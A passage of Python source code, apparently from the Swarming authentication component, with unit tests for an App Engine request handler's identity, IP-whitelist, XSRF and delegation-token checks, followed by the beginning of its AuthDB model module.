extra_environ={'REMOTE_ADDR': '127.0.0.1'})\n\n  def test_anonymous(self):\n    \"\"\"If all auth methods are not applicable, identity is set to Anonymous.\"\"\"\n    test = self\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        non_applicable = lambda _request: None\n        return [non_applicable, non_applicable]\n\n      @api.public\n      def get(self):\n        test.assertEqual(model.Anonymous, api.get_current_identity())\n        self.response.write('OK')\n\n    app = self.make_test_app('/request', Handler)\n    self.assertEqual('OK', app.get('/request').body)\n\n  def test_ip_whitelist_bot(self):\n    \"\"\"Requests from client in \"bots\" IP whitelist are authenticated as bot.\"\"\"\n    model.bootstrap_ip_whitelist('bots', ['192.168.1.100/32'])\n\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(api.get_current_identity().to_bytes())\n\n    app = self.make_test_app('/request', Handler)\n    def call(ip):\n      api.reset_local_state()\n      return app.get('/request', extra_environ={'REMOTE_ADDR': ip}).body\n\n    self.assertEqual('bot:whitelisted-ip', call('192.168.1.100'))\n    self.assertEqual('anonymous:anonymous', call('127.0.0.1'))\n\n  def test_ip_whitelist(self):\n    \"\"\"Per-account IP whitelist works.\"\"\"\n    ident1 = model.Identity(model.IDENTITY_USER, 'a@example.com')\n    ident2 = model.Identity(model.IDENTITY_USER, 'b@example.com')\n\n    model.bootstrap_ip_whitelist('whitelist', ['192.168.1.100/32'])\n    model.bootstrap_ip_whitelist_assignment(ident1, 'whitelist')\n\n    mocked_ident = [None]\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [lambda _req: mocked_ident[0]]\n\n      @api.public\n      def get(self):\n        self.response.write('OK')\n\n    app = self.make_test_app('/request', Handler)\n    def call(ident, ip):\n      api.reset_local_state()\n      mocked_ident[0] = ident\n      response = app.get(\n          '/request', extra_environ={'REMOTE_ADDR': ip}, expect_errors=True)\n      return response.status_int\n\n    # IP is whitelisted.\n    self.assertEqual(200, call(ident1, '192.168.1.100'))\n    # IP is NOT whitelisted.\n    self.assertEqual(403, call(ident1, '127.0.0.1'))\n    # Whitelist is not used.\n    self.assertEqual(200, call(ident2, '127.0.0.1'))\n\n  def test_auth_method_order(self):\n    \"\"\"Registered auth methods are tested in order.\"\"\"\n    test = self\n    calls = []\n    ident = model.Identity(model.IDENTITY_USER, 'joe@example.com')\n\n    def not_applicable(request):\n      self.assertEqual('/request', request.path)\n      calls.append('not_applicable')\n      return None\n\n    def applicable(request):\n      self.assertEqual('/request', request.path)\n      calls.append('applicable')\n      return ident\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [not_applicable, applicable]\n\n      @api.public\n      def get(self):\n        test.assertEqual(ident, api.get_current_identity())\n        self.response.write('OK')\n\n    app = self.make_test_app('/request', Handler)\n    self.assertEqual('OK', app.get('/request').body)\n\n    # Both methods should be tried.\n    expected_calls = [\n      'not_applicable',\n      'applicable',\n    ]\n    self.assertEqual(expected_calls, calls)\n\n  def test_authentication_error(self):\n    \"\"\"AuthenticationError in auth method stops request processing.\"\"\"\n    test = self\n    calls = []\n\n    def failing(request):\n      raise api.AuthenticationError('Too bad')\n\n    def skipped(request):\n      self.fail('authenticate should not be called')\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [failing, skipped]\n\n      @api.public\n      def get(self):\n        test.fail('Handler code should not be called')\n\n      def authentication_error(self, err):\n        test.assertEqual('Too bad', err.message)\n        calls.append('authentication_error')\n        # pylint: disable=bad-super-call\n        super(Handler, self).authentication_error(err)\n\n    app = self.make_test_app('/request', Handler)\n    response = app.get('/request', expect_errors=True)\n\n    # Custom error handler is called and returned HTTP 401.\n    self.assertEqual(['authentication_error'], calls)\n    self.assertEqual(401, response.status_int)\n\n    # Authentication error is logged.\n    self.assertEqual(1, len(self.logged_warnings))\n\n  def test_authorization_error(self):\n    \"\"\"AuthorizationError in auth method is handled.\"\"\"\n    test = self\n    calls = []\n\n    class Handler(handler.AuthenticatingHandler):\n      @api.require(lambda: False)\n      def get(self):\n        test.fail('Handler code should not be called')\n\n      def authorization_error(self, err):\n        calls.append('authorization_error')\n        # pylint: disable=bad-super-call\n        super(Handler, self).authorization_error(err)\n\n    app = self.make_test_app('/request', Handler)\n    response = app.get('/request', expect_errors=True)\n\n    # Custom error handler is called and returned HTTP 403.\n    self.assertEqual(['authorization_error'], calls)\n    self.assertEqual(403, response.status_int)\n\n  def make_xsrf_handling_app(\n      self,\n      xsrf_token_enforce_on=None,\n      xsrf_token_header=None,\n      xsrf_token_request_param=None):\n    \"\"\"Returns webtest app with single XSRF-aware handler.\n\n    If generates XSRF tokens on GET and validates them on POST, PUT, DELETE.\n    \"\"\"\n    calls = []\n\n    def record(request_handler, method):\n      is_valid = request_handler.xsrf_token_data == {'some': 'data'}\n      calls.append((method, is_valid))\n\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(self.generate_xsrf_token({'some': 'data'}))\n      @api.public\n      def post(self):\n        record(self, 'POST')\n      @api.public\n      def put(self):\n        record(self, 'PUT')\n      @api.public\n      def delete(self):\n        record(self, 'DELETE')\n\n    if xsrf_token_enforce_on is not None:\n      Handler.xsrf_token_enforce_on = xsrf_token_enforce_on\n    if xsrf_token_header is not None:\n      Handler.xsrf_token_header = xsrf_token_header\n    if xsrf_token_request_param is not None:\n      Handler.xsrf_token_request_param = xsrf_token_request_param\n\n    app = self.make_test_app('/request', Handler)\n    return app, calls\n\n  def mock_get_current_identity(self, ident):\n    \"\"\"Mocks api.get_current_identity() to return |ident|.\"\"\"\n    self.mock(handler.api, 'get_current_identity', lambda: ident)\n\n  def test_xsrf_token_get_param(self):\n    \"\"\"XSRF token works if put in GET parameters.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    token = app.get('/request').body\n    app.post('/request?xsrf_token=%s' % token)\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_post_param(self):\n    \"\"\"XSRF token works if put in POST parameters.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    token = app.get('/request').body\n    app.post('/request', {'xsrf_token': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_header(self):\n    \"\"\"XSRF token works if put in the headers.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    token = app.get('/request').body\n    app.post('/request', headers={'X-XSRF-Token': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_missing(self):\n    \"\"\"XSRF token is not given but handler requires it.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    response = app.post('/request', expect_errors=True)\n    self.assertEqual(403, response.status_int)\n    self.assertFalse(calls)\n\n  def test_xsrf_token_uses_enforce_on(self):\n    \"\"\"Only methods set in |xsrf_token_enforce_on| require token validation.\"\"\"\n    # Validate tokens only on PUT (not on POST).\n    app, calls = self.make_xsrf_handling_app(xsrf_token_enforce_on=('PUT',))\n    token = app.get('/request').body\n    # Both POST and PUT work when token provided, verifying it.\n    app.post('/request', {'xsrf_token': token})\n    app.put('/request', {'xsrf_token': token})\n    self.assertEqual([('POST', True), ('PUT', True)], calls)\n    # POST works without a token, put PUT doesn't.\n    self.assertEqual(200, app.post('/request').status_int)\n    self.assertEqual(403, app.put('/request', expect_errors=True).status_int)\n    # Only the one that requires the token fails if wrong token is provided.\n    bad_token = {'xsrf_token': 'boo'}\n    self.assertEqual(200, app.post('/request', bad_token).status_int)\n    self.assertEqual(\n        403, app.put('/request', bad_token, expect_errors=True).status_int)\n\n  def test_xsrf_token_uses_xsrf_token_header(self):\n    \"\"\"Name of the header used for XSRF can be changed.\"\"\"\n    app, calls = self.make_xsrf_handling_app(xsrf_token_header='X-Some')\n    token = app.get('/request').body\n    app.post('/request', headers={'X-Some': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_uses_xsrf_token_request_param(self):\n    \"\"\"Name of the request param used for XSRF can be changed.\"\"\"\n    app, calls = self.make_xsrf_handling_app(xsrf_token_request_param='tok')\n    token = app.get('/request').body\n    app.post('/request', {'tok': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_identity_matters(self):\n    app, calls = self.make_xsrf_handling_app()\n    # Generate token for identity A.\n    self.mock_get_current_identity(\n        model.Identity(model.IDENTITY_USER, 'a@example.com'))\n    token = app.get('/request').body\n    # Try to use it by identity B.\n    self.mock_get_current_identity(\n        model.Identity(model.IDENTITY_USER, 'b@example.com'))\n    response = app.post('/request', expect_errors=True)\n    self.assertEqual(403, response.status_int)\n    self.assertFalse(calls)\n\n  def test_get_authenticated_routes(self):\n    class Authenticated(handler.AuthenticatingHandler):\n      pass\n\n    class NotAuthenticated(webapp2.RequestHandler):\n      pass\n\n    app = webapp2.WSGIApplication([\n      webapp2.Route('/authenticated', Authenticated),\n      webapp2.Route('/not-authenticated', NotAuthenticated),\n    ])\n    routes = handler.get_authenticated_routes(app)\n    self.assertEqual(1, len(routes))\n    self.assertEqual(Authenticated, routes[0].handler)\n\n  def test_get_peer_ip(self):\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(ipaddr.ip_to_string(api.get_peer_ip()))\n\n    app = self.make_test_app('/request', Handler)\n    response = app.get('/request', extra_environ={'REMOTE_ADDR': '192.1.2.3'})\n    self.assertEqual('192.1.2.3', response.body)\n\n  def test_get_peer_host(self):\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(api.get_peer_host() or '<none>')\n\n    app = self.make_test_app('/request', Handler)\n    def call(headers):\n      api.reset_local_state()\n      return app.get('/request', headers=headers).body\n\n    # Good token.\n    token = host_token.create_host_token('HOST.domain.com')\n    self.assertEqual('host.domain.com', call({'X-Host-Token-V1': token}))\n\n    # Missing or invalid tokens.\n    self.assertEqual('<none>', call({}))\n    self.assertEqual('<none>', call({'X-Host-Token-V1': 'broken'}))\n\n    # Expired token.\n    origin = datetime.datetime(2014, 1, 1, 1, 1, 1)\n    self.mock_now(origin)\n    token = host_token.create_host_token('HOST.domain.com', expiration_sec=60)\n    self.mock_now(origin, 61)\n    self.assertEqual('<none>', call({'X-Host-Token-V1': token}))\n\n  def test_delegation_token(self):\n    peer_ident = model.Identity.from_bytes('user:peer@a.com')\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [lambda _request: peer_ident]\n\n      @api.public\n      def get(self):\n        self.response.write(json.dumps({\n          'peer_id': api.get_peer_identity().to_bytes(),\n          'cur_id': api.get_current_identity().to_bytes(),\n        }))\n\n    app = self.make_test_app('/request', Handler)\n    def call(headers=None):\n      return json.loads(app.get('/request', headers=headers).body)\n\n    # No delegation.\n    self.assertEqual(\n        {u'cur_id': u'user:peer@a.com', u'peer_id': u'user:peer@a.com'}, call())\n\n    # TODO(vadimsh): Mint token via some high-level function call.\n    subtokens = delegation_pb2.SubtokenList(subtokens=[\n        delegation_pb2.Subtoken(\n            issuer_id='user:delegated@a.com',\n            creation_time=int(utils.time_time()),\n            validity_duration=3600),\n    ])\n    tok = delegation.serialize_token(delegation.seal_token(subtokens))\n\n    # With valid delegation token.\n    self.assertEqual(\n        {u'cur_id': u'user:delegated@a.com', u'peer_id': u'user:peer@a.com'},\n        call({'X-Delegation-Token-V1': tok}))\n\n    # With invalid delegation token.\n    r = app.get(\n        '/request',\n        headers={'X-Delegation-Token-V1': tok + 'blah'},\n        expect_errors=True)\n    self.assertEqual(403, r.status_int)\n\n    # Transient error.\n    def mocked_check(*_args):\n      raise delegation.TransientError('Blah')\n    self.mock(delegation, 'check_delegation_token', mocked_check)\n    r = app.get(\n        '/request',\n        headers={'X-Delegation-Token-V1': tok},\n        expect_errors=True)\n    self.assertEqual(500, r.status_int)\n\n\nclass GaeCookieAuthenticationTest(test_case.TestCase):\n  \"\"\"Tests for gae_cookie_authentication function.\"\"\"\n\n  def test_non_applicable(self):\n    self.assertIsNone(handler.gae_cookie_authentication(webapp2.Request({})))\n\n  def test_applicable(self):\n    os.environ.update({\n      'USER_EMAIL': 'joe@example.com',\n      'USER_ID': '123',\n      'USER_IS_ADMIN': '0',\n    })\n    # Actual request is not used by CookieAuthentication.\n    self.assertEqual(\n        model.Identity(model.IDENTITY_USER, 'joe@example.com'),\n        handler.gae_cookie_authentication(webapp2.Request({})))\n\n\nclass ServiceToServiceAuthenticationTest(test_case.TestCase):\n  \"\"\"Tests for service_to_service_authentication.\"\"\"\n\n  def test_non_applicable(self):\n    request = webapp2.Request({})\n    self.assertIsNone(\n        handler.service_to_service_authentication(request))\n\n  def test_applicable(self):\n    request = webapp2.Request({\n      'HTTP_X_APPENGINE_INBOUND_APPID': 'some-app',\n    })\n    self.assertEqual(\n      model.Identity(model.IDENTITY_SERVICE, 'some-app'),\n      handler.service_to_service_authentication(request))\n\n\nif __name__ == '__main__':\n  if '-v' in sys.argv:\n    unittest.TestCase.maxDiff = None\n  unittest.main()\n/n/n/nappengine/components/components/auth/model.py/n/n# Copyright 2014 The Swarming Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"NDB model classes used to model AuthDB relations.\n\nOverview\n--------\n\nModels defined here are used by central authentication service (that stores all\ngroups and secrets) and by services that implement some concrete functionality\nprotected with ACLs (like isolate and swarming services).\n\nApplications that use auth component may work in 3 modes:\n  1. Standalone. Application is self contained and manages its own groups.\n     Useful when developing a new service or for simple installations.\n  2. Replica. Application uses a central authentication service. An application\n     can be dynamically switched from Standalone to Replica mode.\n  3. Primary. Application IS a central authentication service. Only 'auth'\n     service is running in this mode. 'configure_as_primary' call during startup\n     switches application to that mode.\n\nCentral authentication service (Primary) holds authoritative copy of all auth\nrelated information (groups, secrets, etc.) and acts as a single source of truth\nfor it. All other services (Replicas) hold copies of a relevant subset of\nthis information (that they use to perform authorization checks).\n\nPrimary service is responsible for updating replicas' configuration via\nservice-to-service push based replication protocol.\n\nAuthDB holds a list of groups. Each group has a unique name and is defined\nas union of 3 sets:\n  1) Explicit enumeration of particular Identities e.g. 'user:alice@example.com'\n  2) Set of glob-like identity patterns e.g. 'user:*@example.com'\n  3) Set of nested Groups.\n\nIdentity defines an actor making an action (it can be a real person, a bot,\nan AppEngine application or special 'anonymous' identity).\n\nIn addition to that, AuthDB stores small amount of authentication related\nconfiguration data, such as OAuth2 client_id and client_secret and various\nsecret keys.\n\nAudit trail\n-----------\n\nEach change to AuthDB has an associated revision number (that monotonically\nincreases with each change). All entities modified by a change are copied to\nappend-only log under an entity key associated with the revision (see\nhistorical_revision_key below). Removals are marked by special auth_db_deleted\nflag in entites in the log. This is enough to recover a snapshot of all groups\nat some specific moment in time, or to produce a diff between two revisions.\n\nNote that entities in the historical log are not used by online queries. At any\nmoment in time most recent version of an AuthDB entity exists in two copies:\n  1) Main copy used for online queries. It is mutated in-place with each change.\n  2) Most recent record in the historical log. Read only.\n\nTo reduce a possibility of misuse of historical copies in online transactions,\nhistory log entity classes are suffixied with 'History' suffix. They also have\nall indexes stripped.\n\nThis mechanism is enabled only on services in Standalone or Primary mode.\nReplicas do not keep track of AuthDB revisions and do not keep any historical\nlog.\n\"\"\"\n\nimport collections\nimport fnmatch\nimport logging\nimport os\nimport re\n\nfrom google.appengine.api import app_identity\nfrom google.appengine.ext import ndb\n\nfrom components import datastore_utils\nfrom components import utils\n\nfrom . import ipaddr\n\n# Part of public API of 'auth' component, exposed by this module.\n__all__ = [\n  'ADMIN_GROUP',\n  'Anonymous',\n  'bootstrap_group',\n  'bootstrap_ip_whitelist',\n  'bootstrap_loopback_ips',\n  'BOTS_IP_WHITELIST',\n  'configure_as_primary',\n  'find_group_dependency_cycle',\n  'find_referencing_groups',\n  'get_auth_db_revision',\n  'get_missing_groups',\n  'get_service_self_identity',\n  'group_key',\n  'Identity',\n  'IDENTITY_ANONYMOUS',\n  'IDENTITY_BOT',\n  'IDENTITY_SERVICE',\n  'IDENTITY_USER',\n  'IdentityGlob',\n  'IdentityProperty',\n  'ip_whitelist_key',\n  'is_empty_group',\n  'is_external_group_name',\n  'is_primary',\n  'is_replica',\n  'is_standalone',\n  'is_valid_group_name',\n  'is_valid_ip_whitelist_name',\n  'replicate_auth_db',\n]\n\n\n# Name of a group whose members have access to Group management UI. It's the\n# only group needed to bootstrap everything else.\nADMIN_GROUP = 'administrators'\n\n# Name of AuthIPWhitelist with bots IP ranges. See AuthIPWhitelist.\nBOTS_IP_WHITELIST = 'bots'\n\n# No identity information is provided. Identity name is always 'anonymous'.\nIDENTITY_ANONYMOUS = 'anonymous'\n# Using bot credentials. Identity name is bot's id.\nIDENTITY_BOT = 'bot'\n# Using App Engine service credentials. Identity name is app name.\nIDENTITY_SERVICE = 'service'\n# Using user credentials. Identity name is user's email.\nIDENTITY_USER = 'user'\n\n# All allowed identity kinds + regexps to validate identity name.\nALLOWED_IDENTITY_KINDS = {\n  IDENTITY_ANONYMOUS: re.compile(r'^anonymous$'),\n  IDENTITY_BOT: re.compile(r'^[0-9a-zA-Z_\\-\\.@]+$'),\n  IDENTITY_SERVICE: re.compile(r'^[0-9a-zA-Z_\\-\\:\\.]+$'),\n  IDENTITY_USER: re.compile(r'^[0-9a-zA-Z_\\-\\.\\+]+@[0-9a-z_\\-\\.]+$'),\n}\n\n# Regular expression that matches group names. ASCII only, no leading or\n# trailing spaces allowed (spaces inside are fine).\nGROUP_NAME_RE = re.compile(\n    r'^([a-z\\-]+/)?[0-9a-zA-Z_][0-9a-zA-Z_\\-\\.\\ ]{1,80}[0-9a-zA-Z_\\-\\.]$')\n# Special group name that means 'All possible users' (including anonymous!).\nGROUP_ALL = '*'\n\n# Regular expression for IP whitelist name.\nIP_WHITELIST_NAME_RE = re.compile(r'^[0-9a-zA-Z_\\-\\+\\.\\ ]{2,200}$')\n\n\n# Configuration of Primary service, set by 'configure_as_primary'.\n_replication_callback = None\n\n\n# Root ndb keys of various models. They can't be defined as a module level\n# constants because ndb.Key implicitly includes current APPLICATION_ID. And in\n# testing environment it is '_' during module loading time. Trying to use such\n# key from within a testbed test case results in the following error:\n# BadRequestError: app \"testbed-test\" cannot access app \"_\"'s data\n\n\ndef root_key():\n  \"\"\"Global root key of auth models entity group.\"\"\"\n  return ndb.Key('AuthGlobalConfig', 'root')\n\n\ndef replication_state_key():\n  \"\"\"Key of AuthReplicationState entity.\"\"\"\n  return ndb.Key('AuthReplicationState', 'self', parent=root_key())\n\n\ndef ip_whitelist_assignments_key():\n  \"\"\"Key of AuthIPWhitelistAssignments entity.\"\"\"\n  return ndb.Key('AuthIPWhitelistAssignments', 'default', parent=root_key())\n\n\ndef historical_revision_key(auth_db_rev):\n  \"\"\"Key for entity subgroup that holds changes done in a concrete revision.\"\"\"\n  return ndb.Key('Rev', auth_db_rev, parent=root_key())\n\n\n################################################################################\n## Identity & IdentityGlob.\n\n\nclass Identity(\n    datastore_utils.BytesSerializable,\n    collections.namedtuple('Identity', 'kind, name')):\n  \"\"\"Represents a caller that makes requests. Immutable.\n\n  A tuple of (kind, name) where 'kind' is one of IDENTITY_* constants and\n  meaning of 'name' depends on a kind (see comments for IDENTITY_*).\n  It generalizes accounts of real people, bot accounts and service-to-service\n  accounts.\n\n  It's a pure identity information. Any additional information that may be\n  related to an identity (e.g. registration date, last access time, etc.) should\n  be stored elsewhere using Identity.to_bytes() as a key.\n  \"\"\"\n\n  # Inheriting from tuple requires use of __new__ instead of __init__. __init__\n  # is called with object already 'frozen', so it's not possible to modify its\n  # attributes in __init__.\n  # See http://docs.python.org/2/reference/datamodel.html#object.__new__\n  def __new__(cls, kind, name):\n    if isinstance(name, unicode):\n      try:\n        name = name.encode('ascii')\n      except UnicodeEncodeError:\n        raise ValueError('Identity has invalid format: only ASCII is allowed')\n    if (kind not in ALLOWED_IDENTITY_KINDS or\n        not ALLOWED_IDENTITY_KINDS[kind].match(name)):\n      raise ValueError('Identity has invalid format: %s' % name)\n    return super(Identity, cls).__new__(cls, str(kind), name)\n\n  def to_bytes(self):\n    \"\"\"Serializes this identity to byte buffer.\"\"\"\n    return '%s:%s' % (self.kind, self.name)\n\n  @classmethod\n  def from_bytes(cls, byte_buf):\n    \"\"\"Given a byte buffer returns corresponding Identity object.\"\"\"\n    kind, sep, name = byte_buf.partition(':')\n    if not sep:\n      raise ValueError('Missing \\':\\' separator in Identity string')\n    return cls(kind, name)\n\n  @property\n  def is_anonymous(self):\n    \"\"\"True if this object represents anonymous identity.\"\"\"\n    return self.kind == IDENTITY_ANONYMOUS\n\n  @property\n  def is_bot(self):\n    \"\"\"True if this object represents bot account.\"\"\"\n    return self.kind == IDENTITY_BOT\n\n  @property\n  def is_service(self):\n    \"\"\"True if this object represents service account.\"\"\"\n    return self.kind == IDENTITY_SERVICE\n\n  @property\n  def is_user(self):\n    \"\"\"True if this object represents user account.\"\"\"\n    return self.kind == IDENTITY_USER\n\n\n# Predefined Anonymous identity.\nAnonymous = Identity(IDENTITY_ANONYMOUS, 'anonymous')\n\n\nclass IdentityProperty(datastore_utils.BytesSerializableProperty):\n  \"\"\"NDB model property for Identity values.\n\n  Identities are stored as indexed short blobs internally.\n  \"\"\"\n  _value_type = Identity\n  _indexed = True\n\n\nclass IdentityGlob(\n    datastore_utils.BytesSerializable,\n    collections.namedtuple('IdentityGlob', 'kind, pattern')):\n  \"\"\"Glob-like pattern that matches subset of identities. Immutable.\n\n  Tuple (kind, glob) where 'kind' is is one of IDENTITY_* constants and 'glob'\n  defines pattern that identity names' should match. For example, IdentityGlob\n  that matches all bots is (IDENTITY_BOT, '*') which is also can be written\n  as 'bot:*'.\n  \"\"\"\n\n  # See comment for Identity.__new__ regarding use of __new__ here.\n  def __new__(cls, kind, pattern):\n    if isinstance(pattern, unicode):\n      try:\n        pattern = pattern.encode('ascii')\n      except UnicodeEncodeError:\n        raise ValueError('Invalid IdentityGlob pattern: only ASCII is allowed')\n    if not pattern:\n      raise ValueError('No pattern is given')\n    if kind not in ALLOWED_IDENTITY_KINDS:\n      raise ValueError('Invalid Identity kind: %s' % kind)\n    return super(IdentityGlob, cls).__new__(cls, str(kind), pattern)\n\n  def to_bytes(self):\n    \"\"\"Serializes this identity glob to byte buffer.\"\"\"\n    return '%s:%s' % (self.kind, self.pattern)\n\n  @classmethod\n  def from_bytes(cls, byte_buf):\n    \"\"\"Given a byte buffer returns corresponding IdentityGlob object.\"\"\"\n    kind, sep, pattern = byte_buf.partition(':')\n    if not sep:\n      raise ValueError('Missing \\':\\' separator in IdentityGlob string')\n    return cls(kind, pattern)\n\n  def match(self, identity):\n    \"\"\"Return True if |identity| matches this pattern.\"\"\"\n    if identity.kind != self.kind:\n      return False\n    return fnmatch.fnmatchcase(identity.name, self.pattern)\n\n\nclass IdentityGlobProperty(datastore_utils.BytesSerializableProperty):\n  \"\"\"NDB model property for IdentityGlob values.\n\n  IdentityGlobs are stored as short indexed blobs internally.\n  \"\"\"\n  _value_type = IdentityGlob\n  _indexed = True\n\n\n################################################################################\n## Singleton entities and replication related models.\n\n\ndef configure_as_primary(replication_callback):\n  \"\"\"Registers a callback to be called when AuthDB changes.\n\n  Should be called during Primary application startup. The callback will be\n  called as 'replication_callback(AuthReplicationState)' from inside transaction\n  on root_key() entity group whenever replicate_auth_db() is called (i.e. on\n  every change to auth db that should be replication to replicas).\n  \"\"\"\n  global _replication_callback\n  _replication_callback = replication_callback\n\n\ndef is_primary():\n  \"\"\"Returns True if current application was configured as Primary.\"\"\"\n  return bool(_replication_callback)\n\n\ndef is_replica():\n  \"\"\"Returns True if application is in Replica mode.\"\"\"\n  return not is_primary() and not is_standalone()\n\n\ndef is_standalone():\n  \"\"\"Returns True if application is in Standalone mode.\"\"\"\n  ent = get_replication_state()\n  return not ent or not ent.primary_id\n\n\ndef get_replication_state():\n  \"\"\"Returns AuthReplicationState singleton entity if it exists.\"\"\"\n  return replication_state_key().get()\n\n\ndef get_auth_db_revision():\n  \"\"\"Returns current revision of AuthDB, it increases with each change.\"\"\"\n  state = get_replication_state()\n  return state.auth_db_rev if state else 0\n\n\ndef get_service_self_identity():\n  \"\"\"Returns Identity that correspond to the current GAE app itself.\"\"\"\n  return Identity(IDENTITY_SERVICE, app_identity.get_application_id())\n\n\nclass AuthVersionedEntityMixin(object):\n  \"\"\"Mixin class for entities that keep track of when they change.\n\n  Entities that have this mixin are supposed to be updated in get()\\put() or\n  get()\\delete() transactions. Caller must call record_revision(...) sometime\n  during the transaction (but before put()). Similarly a call to\n  record_deletion(...) is expected sometime before delete().\n\n  replicate_auth_db will store a copy of the entity in the revision log when\n  committing a transaction.\n\n  A pair of properties auth_db_rev and auth_db_prev_rev are used to implement\n  a linked list of versions of this entity (e.g. one can take most recent entity\n  version and go back in time by following auth_db_prev_rev links).\n  \"\"\"\n  # When the entity was modified last time. Do not use 'auto_now' property since\n  # such property overrides any explicitly set value with now() during put. It's\n  # undesired when storing a copy of entity received from Primary (Replica\n  # should have modified_ts to be same as on Primary).\n  modified_ts = ndb.DateTimeProperty()\n  # Who modified the entity last time.\n  modified_by = IdentityProperty()\n\n  # Revision of Auth DB at which this entity was updated last time.\n  auth_db_rev = ndb.IntegerProperty()\n  # Revision of Auth DB of previous version of this entity or None.\n  auth_db_prev_rev = ndb.IntegerProperty()\n\n  def record_revision(self, modified_by, modified_ts=None, comment=None):\n    \"\"\"Updates the entity to record Auth DB revision of the current transaction.\n\n    Stages the entity to be copied to historical log.\n\n    Must be called sometime before 'put' (not necessary right before it). Note\n    that NDB hooks are not used because they are buggy. See docstring for\n    replicate_auth_db for more info.\n\n    Args:\n      modified_by: Identity that made the change.\n      modified_ts: datetime when the change was made (or None for current time).\n      comment: optional comment to put in the revision log.\n    \"\"\"\n    _get_pending_auth_db_transaction().record_change(\n        entity=self,\n        deletion=False,\n        modified_by=modified_by,\n        modified_ts=modified_ts or utils.utcnow(),\n        comment=comment)\n\n  def record_deletion(self, modified_by, modified_ts=None, comment=None):\n    \"\"\"Marks entity as being deleted in the current transaction.\n\n    Stages the entity to be copied to historical log (with 'auth_db_deleted'\n    flag set). The entity must not be mutated between 'get' and AuthDB commit.\n\n    Must be called sometime before 'delete' (not necessary right before it).\n    Note that NDB hooks are not used because they are buggy. See docstring for\n    replicate_auth_db for more info.\n\n    Args:\n      modified_by: Identity that made the change.\n      modified_ts: datetime when the change was made (or None for current time).\n      comment: optional comment to put in the revision log.\n    \"\"\"\n    _get_pending_auth_db_transaction().record_change(\n        entity=self,\n        deletion=True,\n        modified_by=modified_by,\n        modified_ts=modified_ts or utils.utcnow(),\n        comment=comment)\n\n  ## Internal interface. Do not use directly unless you know what you are doing.\n\n  @classmethod\n  def get_historical_copy_class(cls):\n    \"\"\"Returns entity class for historical copies of original entity.\n\n    Has all the same properties, but unindexed (not needed), unvalidated\n    (original entity is already validated) and not cached.\n\n    The name of the new entity class is \"<original name>History\" (to make sure\n    it doesn't show up in indexes for original entity class).\n    \"\"\"\n    existing = getattr(cls, '_auth_db_historical_copy_cls', None)\n    if existing:\n      return existing\n    props = {}\n    for name, prop in cls._properties.iteritems():\n      # Whitelist supported property classes. Better to fail loudly when\n      # encountering something new, rather than silently produce (possibly)\n      # incorrect result. Note that all AuthDB classes are instantiated in\n      # unit tests, so there should be no unexpected asserts in production.\n      assert prop.__class__ in (\n        IdentityGlobProperty,\n        IdentityProperty,\n        ndb.BlobProperty,\n        ndb.BooleanProperty,\n        ndb.DateTimeProperty,\n        ndb.IntegerProperty,\n        ndb.LocalStructuredProperty,\n        ndb.StringProperty,\n        ndb.TextProperty,\n      ), prop.__class__\n      kwargs = {\n        'name': prop._name,\n        'indexed': False,\n        'required': False,\n        'repeated': prop._repeated,\n      }\n      if prop.__class__ == ndb.LocalStructuredProperty:\n        kwargs['modelclass'] = prop._modelclass\n      props[name] = prop.__class__(**kwargs)\n    new_cls = type(\n        '%sHistory' % cls.__name__, (_AuthDBHistoricalEntity,), props)\n    cls._auth_db_historical_copy_cls = new_cls\n    return new_cls\n\n  def make_historical_copy(self, deleted, comment):\n    \"\"\"Returns an entity to put in the historical log.\n\n    It's a copy of the original entity, but stored under another key and with\n    indexes removed. It also has a bunch of additional properties (defined\n    in _AuthDBHistoricalEntity). See 'get_historical_copy_class'.\n\n    The key is derived from auth_db_rev and class and ID of the original entity.\n    For example, AuthGroup \"admins\" modified at rev 123 will be copied to\n    the history as ('AuthGlobalConfig', 'root', 'Rev', 123, 'AuthGroupHistory',\n    'admins'), where the key prefix (first two pairs) is obtained with\n    historical_revision_key(...).\n    \"\"\"\n    assert self.key.parent() == root_key() or self.key == root_key(), self.key\n    cls = self.get_historical_copy_class()\n    entity = cls(\n        id=self.key.id(),\n        parent=historical_revision_key(self.auth_db_rev))\n    for prop in self._properties:\n      setattr(entity, prop, getattr(self, prop))\n    entity.auth_db_deleted = deleted\n    entity.auth_db_change_comment = comment\n    entity.auth_db_app_version = utils.get_app_version()\n    return entity\n\n\nclass AuthGlobalConfig(ndb.Model, AuthVersionedEntityMixin):\n  \"\"\"Acts as a root entity for auth models.\n\n  There should be only one instance of this model in Datastore, with a key set\n  to root_key(). A change to an entity group rooted at this key is a signal that\n  AuthDB has to be refetched (see 'fetch_auth_db' in api.py).\n\n  Entities that change often or associated with particular bot or user\n  MUST NOT be in this entity group.\n\n  Content of this particular entity is replicated from Primary service to all\n  Replicas.\n\n  Entities that belong to this entity group are:\n   * AuthGroup\n   * AuthIPWhitelist\n   * AuthIPWhitelistAssignments\n   * AuthReplicationState\n   * AuthSecret\n  \"\"\"\n  # OAuth2 client_id to use to mint new OAuth2 tokens.\n  oauth_client_id = 